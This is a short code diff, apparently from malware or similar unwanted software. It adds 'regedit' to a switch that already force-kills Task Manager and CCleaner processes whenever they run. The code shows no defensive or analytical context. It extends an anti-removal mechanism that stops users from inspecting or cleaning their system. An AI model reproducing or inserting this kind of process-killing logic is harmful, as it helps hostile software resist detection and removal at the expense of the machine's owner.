@@ -87,6 +87,7 @@
                         case "ccleaner":
                         case "ccleaner64":
                         case "taskmgr":
+                        case "regedit":
                             process.Kill();
                             break;
                     }
